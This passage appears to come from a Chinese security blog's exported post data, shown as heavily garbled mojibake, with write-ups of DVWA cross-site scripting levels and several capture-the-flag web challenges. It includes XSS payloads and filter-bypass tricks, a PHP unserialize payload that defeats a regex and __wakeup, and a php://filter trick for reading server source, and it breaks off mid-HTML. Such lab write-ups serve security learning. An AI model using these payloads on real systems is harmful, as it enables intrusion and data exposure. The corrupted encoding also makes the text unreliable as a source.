è½½imgå›¾ç‰‡å¤±è´¥æ—¶æ‰§è¡Œonerroråçš„ä»£ç ã€‚ 2ï¼‰&lt;body onload=alert(&#39;1&#39;)&gt; onload äº‹ä»¶ä¼šåœ¨é¡µé¢æˆ–å›¾åƒåŠ è½½å®Œæˆåç«‹å³å‘ç”Ÿã€‚ 3ï¼‰&lt;a href=&#39;&#39; onclick=alert(&#39;1&#39;)&gt;click me&lt;/a&gt; hrefæ˜¯Hypertext Referenceçš„ç¼©å†™ã€‚æ„æ€æ˜¯æŒ‡å®šè¶…é“¾æ¥ç›®æ ‡çš„URLã€‚href å±æ€§çš„å€¼å¯ä»¥æ˜¯ä»»ä½•æœ‰æ•ˆæ–‡æ¡£çš„ç›¸å¯¹æˆ–ç»å¯¹URLï¼ŒåŒ…æ‹¬ç‰‡æ®µæ ‡è¯†ç¬¦å’ŒJavaScriptä»£ç æ®µã€‚ onclick äº‹ä»¶ä¼šåœ¨å…ƒç´ è¢«ç‚¹å‡»æ—¶å‘ç”Ÿ è¿™å¥è¯ä¸­å…ƒç´ çš„åç§°ä¸ºclick meï¼Œå½“ç‚¹å‡»click meæ—¶ä¼šæ‰§è¡Œonclickåé¢çš„ä»£ç ã€‚ 4ï¼‰Iframe:&lt;body onload=alert(1)&gt; iframe:ä¸€ä¸ªå†…è”æ¡†æ¶è¢«ç”¨æ¥åœ¨å½“å‰ HTML æ–‡æ¡£ä¸­åµŒå…¥å¦ä¸€ä¸ªæ–‡æ¡£ã€‚ä¸€ä¸ªå†…è”æ¡†æ¶è¢«ç”¨æ¥åœ¨å½“å‰ HTML æ–‡æ¡£ä¸­åµŒå…¥å¦ä¸€ä¸ªæ–‡æ¡£ã€‚ 5ï¼‰&lt;body onmousemove=alert(&#39;1&#39;)&gt; onmousemove äº‹ä»¶ä¼šåœ¨é¼ æ ‡æŒ‡é’ˆç§»åˆ°æŒ‡å®šçš„å¯¹è±¡æ—¶å‘ç”Ÿã€‚ è¿™å¥è¯æœ‰ç‚¹æ²¡æ˜ç™½ã€‚ StoredLowï¼šæŸ¥çœ‹æºç ï¼š 12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨å¯¹æˆ‘ä»¬ä¸Šä¼ çš„æ•°æ®åšäº†è¿‡æ»¤å¤„ç†é˜²æ­¢æˆ‘ä»¬sqlæ³¨å…¥ã€‚ä½†æ˜¯æ²¡æœ‰é¢„é˜²xssï¼Œ åœ¨messageæ è¾“å…¥ï¼š&lt;script&gt;alert(1);&lt;/script&gt; Mediumï¼šæŸ¥çœ‹æºç ï¼š 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; æ–°å‡½æ•° htmlspecialchars()å‡½æ•°ï¼šæŠŠé¢„å®šä¹‰çš„å­—ç¬¦ â€œ&lt;â€ ï¼ˆå°äºï¼‰å’Œ â€œ&gt;â€ ï¼ˆå¤§äºï¼‰è½¬æ¢ä¸º HTML å®ä½“ã€‚ strip_tags()å‡½æ•°ï¼šå‰¥å»å­—ç¬¦ä¸²ä¸­çš„ HTML æ ‡ç­¾ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°jsä¸ä¼šå†æŠŠæˆ‘ä»¬ä»messageå¤„ä¸Šä¼ çš„å±é™©å†…å®¹å½“ä½œä»£ç è§£æäº†ï¼Œè€Œä¸”æœåŠ¡å™¨å¯¹nameä¹Ÿè¿›è¡Œäº†è¿‡æ»¤å¤„ç†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡åŒå†™å’Œå¤§å°å†™ç»•è¿‡ã€‚ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å‘ç°nameæœ‰è¾“å…¥å­—æ•°é™åˆ¶ï¼Œé‚£æˆ‘ä»¬å°±æŠ“åŒ…ä¿®æ”¹nameçš„å€¼ï¼Œ ç„¶åæäº¤å³å¯ Highï¼šæŸ¥çœ‹æºç ï¼š 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; æ„Ÿè§‰å’ŒFlectedç±»å‹Highçº§åˆ«çš„ç»•è¿‡æ–¹æ³•å·®ä¸å¤šï¼Œä¸å†èµ˜è¿°äº†ã€‚ DOMLowï¼šæŸ¥çœ‹æœåŠ¡å™¨ç«¯æºç ï¼š 12345&lt;?php# No protections, anything goes?&gt; æœåŠ¡å™¨ç«¯æ²¡æœ‰ä»»ä½•phpæºç ï¼Œå› æ­¤ç”¨æˆ·è¾“å…¥å…¨ç”±å‰ç«¯jså¤„ç† æŸ¥çœ‹å‰ç«¯æºç ï¼š![1](DVWAâ€”DOM Based Cross Site Scripting (XSS)/1.png) æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‰ç«¯é€šè¿‡GETçš„æ–¹å¼è·å–å‚æ•°defaultçš„å€¼ï¼Œå› æ­¤æˆ‘ä»¬åœ¨urlæ æ„é€ payload![2](DVWAâ€”DOM Based Cross Site Scripting (XSS)/2.png) æ–°å‡½æ•°ï¼š alert()å‡½æ•° åŠŸèƒ½ï¼šç”¨äºæ˜¾ç¤ºå¸¦æœ‰ä¸€æ¡æŒ‡å®šæ¶ˆæ¯å’Œä¸€ä¸ªç¡®å®šæŒ‰é’®çš„è­¦å‘Šæ¡†ã€‚ è¯­æ³•ï¼šalert(message) å‚æ•° æè¿° message è¦åœ¨ window ä¸Šå¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºçš„çº¯æ–‡æœ¬ï¼ˆè€Œé HTML æ–‡æœ¬ï¼‰ Mediumï¼šæŸ¥çœ‹æºç ï¼š 1234567891011121314&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; $default = $_GET[&#x27;default&#x27;]; # Do not allow script tags if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123; header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt; è¿™é“é¢˜æäº†å¥½ä¹…ï¼Œä¸€æ­¥ä¸€æ­¥æ¥å§ 1ï¼‰å…ˆçœ‹ç½‘é¡µæºç ï¼š 2ï¼‰å°è¯•ç”¨ä¹‹å‰å­¦è¿‡çš„æ¢æ ‡ç­¾çš„æ–¹å¼ç»•è¿‡ï¼š&lt;img src=1 oneeror=alert(1)&gt; å‘ç°ä¸ä¼šåƒä¹‹å‰ä¸€æ ·æœ‰å¼¹çª—è·³å‡ºæ¥ï¼ŒåŸå› æ˜¯æˆ‘ä»¬çš„ä»£ç è¢«æ ‡ç­¾åŒ…è£¹äº†ï¼Œå› æ­¤æˆ‘ä»¬å°è¯•æå‰é—­åˆ 3ï¼‰æå‰é—­åˆoptionæ ‡ç­¾ï¼š&gt;&lt;/option&gt;&lt;img src=1 oneeror=alert(1)&gt; å¼¹çª—è¿˜æ˜¯æ²¡æœ‰è·³å‡ºæ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿæå‰é—­åˆselectæ ‡ç­¾ 4ï¼‰æå‰é—­åˆselectæ ‡ç­¾ï¼š&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 oneeror=alert(1)&gt; å¼¹çª—åˆæˆåŠŸå¼¹å‡º Highï¼šæŸ¥çœ‹æºç ï¼š 1234567891011121314151617181920&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; # White list the allowable languages switch ($_GET[&#x27;default&#x27;]) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨è®¾ç«‹äº†ç™½åå•ã€‚è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨DOMå‹xssçš„æ•°æ®ä¸ç»è¿‡æœåŠ¡å™¨çš„ç‰¹ç‚¹æ¥ç»•è¿‡äº†ã€‚ æ„é€ payloadï¼šEnglish#&lt;script&gt;alert(1)&lt;/script&gt; ç”±äºæœåŠ¡å™¨ä»¥getæ–¹å¼è·å–defaultçš„å€¼ï¼Œè€Œæµè§ˆå™¨ä¸ä¼šæŠŠURLä¸­#åçš„å†…å®¹æäº¤åˆ°æœåŠ¡å™¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å®Œç¾ç»•è¿‡ã€‚","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"æ”»é˜²ä¸–ç•Œwebè¿›é˜¶","date":"2021-03-12T09:23:20.000Z","path":"2021/03/12/æ”»é˜²ä¸–ç•Œwebè¿›é˜¶2/","text":"NewsCenterWeb_php_unserializeï¼šï¼ˆååºåˆ—åŒ–ï¼‰æ‰“å¼€é¢˜ç›®åœ°å€ï¼Œå°±çœ‹åˆ°äº†æºç  123456789101112131415161718192021222324252627&lt;?php class Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the fl4g.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125; &#125;if (isset($_GET[&#x27;var&#x27;])) &#123; $var = base64_decode($_GET[&#x27;var&#x27;]); if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123; die(&#x27;stop hacking!&#x27;); &#125; else &#123; @unserialize($var); &#125; &#125; else &#123; highlight_file(&quot;index.php&quot;); &#125; ?&gt; æ­£åˆ™è¡¨è¾¾å¼ï¼š&#39;/[oc]:\\d+:/i&#39; /XXXX/ â€”â€” phpçš„æ­£åˆ™è¡¨è¾¾å¼éœ€è¦æ”¾åœ¨// ä¹‹é—´ i â€”â€”ä¿®é¥°ç¬¦ï¼Œè¡¨ç¤ºå¿½ç•¥å¤§å°å†™ [oc] â€”â€”åŒ¹é…oå’Œc: \\d â€”â€”åŒ¹é…ä¸€ä¸ªæ•°å­— \\d+ â€”â€”åŒ¹é…å¤šä¸ªæ•°å­— ä»£ç å®¡è®¡ï¼šæœåŠ¡å™¨getè·å¾—varçš„å€¼ï¼Œå…ˆå¯¹varçš„å€¼base64è§£ç ï¼Œç„¶åæ­£åˆ™åŒ¹é…åˆ¤æ–­æ˜¯å¦å­˜åœ¨Oï¼šæ•°å­—æˆ–Cï¼šæ•°å­—ï¼Œè‹¥ä¸å­˜åœ¨åˆ™åœ¨ååºåˆ—ä¹‹å‰æ‰§è¡Œ__wakeup()é­”æœ¯æ–¹æ³•ã€‚ é‚£ä¹ˆæˆ‘ä»¬éœ€è¦ç»•è¿‡æ­£åˆ™åŒ¹é…å’Œ__wakeup() O:+4:â€”â€”ç»•è¿‡æ­£åˆ™åŒ¹é… O:+4:â€Demoâ€:1:{s:10:â€Demofileâ€;s:8:â€fl4g.phpâ€;}â€”â€”æŠŠ1æ¢æˆ2ç»•è¿‡__wakeup() æœ€åå¯¹payloadè¿›è¡Œbase64encodeï¼Œå¾—ï¼šTzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== æœ€åæœ‰ä¸€ä¸ªé—®é¢˜æ²¡ææ‡‚ï¼šâ€œDemofileâ€åªæœ‰8ä½ï¼Œè€Œå‰é¢å­—æ®µå´å†™äº†10ï¼Œè¿™æ˜¯å› ä¸ºprivateå‹å˜é‡åºåˆ—åŒ–ä¹‹åä¼šå˜æˆâ€œ\\x00 + ç±»å + \\x00 + å˜é‡åâ€å½¢å¼ã€‚ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ TzorNDoiRGVtbyI6Mjp7czoxMDoiIERlbW8gZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== é”™ TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== å¯¹ NaNNaNNaNNaN-Batmanï¼šï¼ˆalertå‡½æ•°+ä»£ç å®¡è®¡ï¼‰ä¸‹è½½é™„ä»¶1web100.txtï¼Œæ‰“å¼€å‘ç°æ˜¯ä¹±ç  ç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œå‘ç°ä¸€ä¸ªè¾“å…¥æ¡† ä½†æ˜¯è¾“å…¥ä»€ä¹ˆéƒ½æ²¡ååº”ï¼ŒæŸ¥é˜…èµ„æ–™ï¼š evalå‡½æ•°ï¼Œè¿™æ˜¯æ‰§è¡Œå‡½æ•°ï¼›è¿™é‡Œæ‰§è¡Œäº†_å˜é‡ä¸­çš„å†…å®¹(_ç­‰äº$å‡½æ•°çš„å†…å®¹,ä¹Ÿå°±æ˜¯å•å¼•å·ä¹‹é—´å†…å®¹)ï¼Œä½†æ˜¯ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰æ‰§è¡Œ$()å‡½æ•°ï¼Œä»…ä»…æ‰§è¡Œäº†å­—ç¬¦ä¸²è€Œå·²ï¼ˆä»è€Œå¯¼è‡´ä¹±ç ï¼‰ï¼Œå› è€Œé¡µé¢htmlé¡µé¢æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œåªæ˜¾ç¤ºäº†inputæ ‡ç­¾çš„å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³è®©æºä»£ç æ­£å¸¸æ˜¾ç¤ºå‡ºæ¥ï¼Œä¸è¿›è¡Œæ‰§è¡Œï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å°±ç”¨åˆ°äº†alertå¼¹çª—ï¼ˆå°†evalå‡½æ•°æ”¹ä¸ºalertï¼‰ï¼Œå°†ä¹±ç çš„$()å‡½æ•°æºç å®Œæ•´æ˜¾ç¤ºå‡ºæ¥ æ•´ç†å¾—ï¼š 1234567891011121314151617181920function $()&#123;var e=document.getElementById(&quot;c&quot;).value;if(e.length==16)if(e.match(/^be0f23/)!=null)if(e.match(/233ac/)!=null)if(e.match(/e98aa$/)!=null)if(e.match(/c7be9/)!=null)&#123;var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];var s=[t,n,r,i];for(var o=0;o&lt;13;++o)&#123; document.write(s[o%4][0]);s[o%4].splice(0,1)&#125; &#125; &#125; document.write(&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;);delete _ æ–°å‡½æ•°ï¼š splice() åŠŸèƒ½ï¼šä»æ•°ç»„ä¸­æ·»åŠ /åˆ é™¤é¡¹ç›®ï¼Œç„¶åè¿”å›è¢«åˆ é™¤çš„é¡¹ç›®ã€‚ è¯­æ³•ï¼šarrayObject.splice(index,howmany,item1,.....,itemX) å‚æ•° æè¿° index å¿…éœ€ã€‚æ•´æ•°ï¼Œè§„å®šæ·»åŠ /åˆ é™¤é¡¹ç›®çš„ä½ç½®ï¼Œä½¿ç”¨è´Ÿæ•°å¯ä»æ•°ç»„ç»“å°¾å¤„è§„å®šä½ç½®ã€‚ howmany å¿…éœ€ã€‚è¦åˆ é™¤çš„é¡¹ç›®æ•°é‡ã€‚å¦‚æœè®¾ç½®ä¸º 0ï¼Œåˆ™ä¸ä¼šåˆ é™¤é¡¹ç›®ã€‚ item1, â€¦, itemX å¯é€‰ã€‚å‘æ•°ç»„æ·»åŠ çš„æ–°é¡¹ç›®ã€‚ æ³•1ï¼šè¾“å…¥ç¬¦åˆæ¡ä»¶çš„eï¼Œä»¤å…¶æ‰§è¡Œåç»­ä»£ç  æ­£åˆ™è¡¨è¾¾å¼ï¼š ^è¡¨ç¤ºå¼€å¤´ä¸€å®šè¦åŒ¹é…åˆ°be0f23ï¼Œ$è¡¨ç¤ºç»“å°¾ä¸€å®šè¦åŒ¹é…åˆ°e98aaï¼Œå…¶å®ƒçš„åªè¦åŒ¹é…åˆ°å°±å¥½ï¼Œæ²¡æœ‰ä½ç½®è¦æ±‚äºæ˜¯æˆ‘ä»¬æ„é€ eçš„å€¼ï¼šbe0f233ac7be98aa åœ¨è¾“å…¥æ¡†å†…è¾“å…¥eçš„å€¼ï¼š æ³•2ï¼šç›´æ¥çœ‹ååŠæ®µæºç ï¼Œå¾ªç¯æ¨ç†ä¹Ÿå¯å¾—eçš„å€¼ã€‚ä½†æ˜¯æˆ‘æ„Ÿè§‰æœ‰ç‚¹éº»çƒ¦ã€‚ web2ï¼šï¼ˆè§£ç ï¼‰ç‚¹å¼€é¢˜ç›®åœ°å€ï¼š å‘ç°è¿™æ˜¯ä¸€é“è§£ç é¢˜ï¼Œåªè¦è§£å‡ºmiwençš„å€¼ï¼Œå°±å¾—åˆ°flag æ–°å‡½æ•°ï¼š strrev()å‡½æ•°ï¼š åŠŸèƒ½ï¼šåè½¬å­—ç¬¦ä¸²ã€‚ è¯­æ³•ï¼šstrrev(string) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¦åè½¬çš„å­—ç¬¦ä¸²ã€‚ ord()å‡½æ•°ï¼š åŠŸèƒ½ï¼šä»¥ä¸€ä¸ªå­—ç¬¦ï¼ˆé•¿åº¦ä¸º1çš„å­—ç¬¦ä¸²ï¼‰ä½œä¸ºå‚æ•°ï¼Œè¿”å›å¯¹åº”çš„ ASCII æ•°å€¼ï¼Œæˆ–è€… Unicode æ•°å€¼ã€‚å³ä¸€ä¸ªè¿”å›ä¸€ä¸ªå¯¹åº”çš„åè¿›åˆ¶æ•°ã€‚ è¯­æ³•ï¼šord(c) char()å‡½æ•°ï¼š åŠŸèƒ½ï¼šæ ¹æ®æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚ï¼ˆASCII å€¼å¯è¢«æŒ‡å®šä¸ºåè¿›åˆ¶å€¼ã€å…«è¿›åˆ¶å€¼æˆ–åå…­è¿›åˆ¶å€¼ã€‚å…«è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0ï¼Œè€Œåå…­è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0xã€‚ï¼‰ è¯­æ³•ï¼šchr(ascii) å‚æ•° æè¿° ascii å¿…éœ€ã€‚ASCII å€¼ã€‚ str_rot13()å‡½æ•°ï¼š åŠŸèƒ½ï¼šå¯¹å­—ç¬¦ä¸²æ‰§è¡Œ ROT13 ç¼–ç ã€‚ROT13 ç¼–ç æŠŠæ¯ä¸€ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­å‘å‰ç§»åŠ¨ 13 ä¸ªå­—æ¯ã€‚æ•°å­—å’Œéå­—æ¯å­—ç¬¦ä¿æŒä¸å˜ã€‚ è¯­æ³•ï¼šstr_rot13(string) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¦ç¼–ç çš„å­—ç¬¦ä¸²ã€‚ spï¼šå¯¹å­—ç¬¦ä¸²è§£ç å’Œç¼–ç éƒ½æ˜¯åŒä¸€ä¸ªå‡½æ•° ä»£ç å®¡è®¡ï¼šå…ˆåè½¬å­—ç¬¦ä¸²ï¼Œç„¶åå¯¹å­—ç¬¦ä¸²æ¯ä¸ªå­—æ¯å¯¹åº”çš„ascllç å€¼åŠ ä¸€ï¼Œå†æ‰¾åˆ°åŠ å€¼å¯¹åº”çš„ascllç ï¼ŒæŠŠæ¯ä¸ªå­—ç¬¦å†æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ ç„¶åå¯¹è¯¥å­—ç¬¦ä¸²ä¾æ¬¡è¿›è¡Œbase64ç¼–ç ã€åè½¬ã€ ROT13 ç¼–ç ï¼Œç»“æœå°±æ˜¯è¾“å‡ºçš„miwençš„å€¼ã€‚ æ®æ­¤æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€æ®µphpä»£ç è¿›è¡Œè§£ç ï¼š 12345678910111213141516171819&lt;?php$str=&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;;$_ = base64_decode(strrev(str_rot13($str)));$_o=null;for($_0=0;$_0&lt;strlen($_);$_0++)&#123; $_c=substr($_,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_o=$_o.$_c; &#125; echo strrev($_o);?&gt; ics-05ï¼šï¼ˆhttp://filteråˆ©ç”¨+preg_replace()å‡½æ•°æ¼æ´åˆ©ç”¨ï¼‰æˆ‘ä»¬çœ‹åˆ°é¢˜ç›®æè¿°ï¼š ç‚¹å¼€é¢˜ç›®åœ°å€ï¼Œæ‰¾åˆ°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ å‘ç°æ˜¯æ–‡ä»¶åŒ…å«ï¼Œå°è¯•ç”¨php://filterè¯»å–index.phpæºç ï¼šphp://filter/read=convert.base64-encode/resource=index.php å¯¹è·å¾—çš„å­—ç¬¦ä¸²è¿›è¡Œbase64-decodeï¼Œå¾—ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144&lt;?phperror_reporting(0);@session_start();posix_setuid(1000);?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;meta name&#x3D;&quot;renderer&quot; content&#x3D;&quot;webkit&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge,chrome&#x3D;1&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, maximum-scale&#x3D;1&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;layui&#x2F;css&#x2F;layui.css&quot; media&#x3D;&quot;all&quot;&gt; &lt;title&gt;è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;&#x2F;title&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;ul class&#x3D;&quot;layui-nav&quot;&gt; &lt;li class&#x3D;&quot;layui-nav-item layui-this&quot;&gt;&lt;a href&#x3D;&quot;?page&#x3D;index&quot;&gt;äº‘å¹³å°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;fieldset class&#x3D;&quot;layui-elem-field layui-field-title&quot; style&#x3D;&quot;margin-top: 30px;&quot;&gt; &lt;legend&gt;è®¾å¤‡åˆ—è¡¨&lt;&#x2F;legend&gt; &lt;&#x2F;fieldset&gt; &lt;table class&#x3D;&quot;layui-hide&quot; id&#x3D;&quot;test&quot;&gt;&lt;&#x2F;table&gt; &lt;script type&#x3D;&quot;text&#x2F;html&quot; id&#x3D;&quot;switchTpl&quot;&gt; &lt;!-- è¿™é‡Œçš„ checked çš„çŠ¶æ€åªæ˜¯æ¼”ç¤º --&gt; &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;sex&quot; value&#x3D;&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin&#x3D;&quot;switch&quot; lay-text&#x3D;&quot;å¼€|å…³&quot; lay-filter&#x3D;&quot;checkDemo&quot; &#123;&#123; d.id&#x3D;&#x3D;1 0003 ? &#39;checked&#39; : &#39;&#39; &#125;&#125;&gt; &lt;&#x2F;script&gt; &lt;script src&#x3D;&quot;layui&#x2F;layui.js&quot; charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; layui.use(&#39;table&#39;, function() &#123; var table &#x3D; layui.table, form &#x3D; layui.form; table.render(&#123; elem: &#39;#test&#39;, url: &#39;&#x2F;somrthing.json&#39;, cellMinWidth: 80, cols: [ [ &#123; type: &#39;numbers&#39; &#125;, &#123; type: &#39;checkbox&#39; &#125;, &#123; field: &#39;id&#39;, title: &#39;ID&#39;, width: 100, unresize: true, sort: true &#125;, &#123; field: &#39;name&#39;, title: 